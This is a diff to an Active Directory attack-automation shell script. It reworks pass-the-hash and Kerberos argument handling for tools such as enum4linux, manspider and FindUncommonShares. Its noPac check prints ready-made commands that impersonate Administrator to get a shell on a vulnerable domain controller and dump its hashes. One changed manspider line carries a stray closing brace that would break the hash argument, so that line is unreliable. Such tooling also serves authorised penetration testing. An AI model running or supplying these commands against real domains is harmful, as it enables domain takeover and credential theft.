@@ -335,7 +335,7 @@ prepare (){
             argument_imp=" -hashes ${hash} ${domain}/${user}"
             argument_imp_gp=" -hashes ${hash} ${domain}/${user}"
             argument_bhd="-u ${user}@${domain} --hashes ${hash} --auth-method ntlm"
-            argument_enum4linux="-w ${domain} -u ${user} -H $(expr substr $hash 1 32)"
+            argument_enum4linux="-w ${domain} -u ${user} -H $(expr substr $hash 34 65)"
             argument_adidns="-u ${domain}\\${user} -p ${hash}"
             argument_ldd="-u ${domain}\\${user} -p ${hash}"
             argument_smbmap="-d ${domain} -u ${user} -p ${hash}"
@@ -349,7 +349,7 @@ prepare (){
             argument_silenthd="-u ${domain}\\${user} --hashes ${hash}"
             argument_windap="-d ${domain} -u ${user} --hash ${hash}"
             argument_targkerb="-d ${domain} -u ${user} -H ${hash}"
-            argument_manspider="-d ${domain} -u ${user} -H ${hash}"
+            argument_manspider="-d ${domain} -u ${user} -H $(expr substr $hash 34 65)}"
             argument_coercer="-d ${domain} -u ${user} --hashes ${hash}"
             pass_bool=false
             kerb_bool=false
@@ -398,7 +398,6 @@ prepare (){
             argument_certsync="-d ${domain} -u ${user} -use-kcache -no-pass -k"
             argument_donpapi="-k -no-pass ${domain}/${user}"
             argument_targkerb="-d ${domain} -u ${user} -k --no-pass"
-            argument_finduncshar="-d ${domain} -u ${user} -k --no-pass"
             kdc="$(echo $dc_FQDN | cut -d '.' -f 1)"
             auth_string="${YELLOW}[i]${NC} Authentication method: Kerberos Ticket of $user located at $(realpath $krb5cc)"
         else
@@ -1455,8 +1454,8 @@ finduncshar_scan () {
         echo -e "${RED}[-] Please verify the installation of FindUncommonShares${NC}"
     else
         echo -e "${BLUE}[*] Enumerating Shares using FindUncommonShares${NC}"
-        if [ "${hash_bool}" == true ] || [ "${aeskey_bool}" == true ]; then
-            echo -e "${PURPLE}[-] FindUncommonShares does not support PtH nor authentication using AES key${NC}"
+        if [ "${hash_bool}" == true ] || [ "${kerb_bool}" == true ] || [ "${aeskey_bool}" == true ]; then
+            echo -e "${PURPLE}[-] FindUncommonShares does not support PtH nor kerberos authentication${NC}"
         else
             if [ "${ldaps_bool}" == true ]; then ldaps_param="--use-ldaps"; else ldaps_param=""; fi
             command="${FindUncommonShares} ${argument_finduncshar} ${ldaps_param} --dc-ip ${dc_ip} --check-user-access --export-xlsx ${output_dir}/Shares/finduncshar_${dc_domain}.xlsx"
@@ -1504,18 +1503,22 @@ manspider_scan () {
 ###### Vulnerability checks
 nopac_check () {
     echo -e "${BLUE}[*] NoPac check ${NC}"
-    for i in $(/bin/cat ${target_dc}); do
-        command="${crackmapexec} ${cme_verbose} smb ${i} ${argument_cme[@]} -M nopac --log ${output_dir}/Vulnerabilities/cme_nopac_output_${dc_domain}.txt"
-        echo "$(date +%Y-%m-%d\ %H:%M:%S); $command" >> $command_log
-        $command 2>&1
-        if grep -q "VULNERABLE" ${output_dir}/Vulnerabilities/cme_nopac_output_${dc_domain}.txt 2>/dev/null; then
-            echo -e "${GREEN}[+] Domain controller vulnerable to noPac found! Follow steps below for exploitation:${NC}"
-            echo -e "${CYAN}# Get shell:${NC}"
-            echo -e "noPac.py ${argument_imp} -dc-ip $dc_ip ${argument_ThePorgs} --impersonate Administrator -shell [-use-ldap]"
-            echo -e "${CYAN}# Dump hashes:${NC}"
-            echo -e "noPac.py ${argument_imp} -dc-ip $dc_ip ${argument_ThePorgs} --impersonate Administrator -dump [-use-ldap]"
-        fi
-    done
+    if [ "${kerb_bool}" == true ] ; then
+        echo -e "${PURPLE}[-] cme's nopac does not support kerberos authentication${NC}"
+    else
+        for i in $(/bin/cat ${target_dc}); do
+            command="${crackmapexec} ${cme_verbose} smb ${i} ${argument_cme[@]} -M nopac --log ${output_dir}/Vulnerabilities/cme_nopac_output_${dc_domain}.txt"
+            echo "$(date +%Y-%m-%d\ %H:%M:%S); $command" >> $command_log
+            $command 2>&1
+            if grep -q "VULNERABLE" ${output_dir}/Vulnerabilities/cme_nopac_output_${dc_domain}.txt 2>/dev/null; then
+                echo -e "${GREEN}[+] Domain controller vulnerable to noPac found! Follow steps below for exploitation:${NC}"
+                echo -e "${CYAN}# Get shell:${NC}"
+                echo -e "noPac.py ${argument_imp} -dc-ip $dc_ip ${argument_ThePorgs} --impersonate Administrator -shell [-use-ldap]"
+                echo -e "${CYAN}# Dump hashes:${NC}"
+                echo -e "noPac.py ${argument_imp} -dc-ip $dc_ip ${argument_ThePorgs} --impersonate Administrator -dump [-use-ldap]"
+            fi
+        done
+    fi
     echo -e ""
 }
 
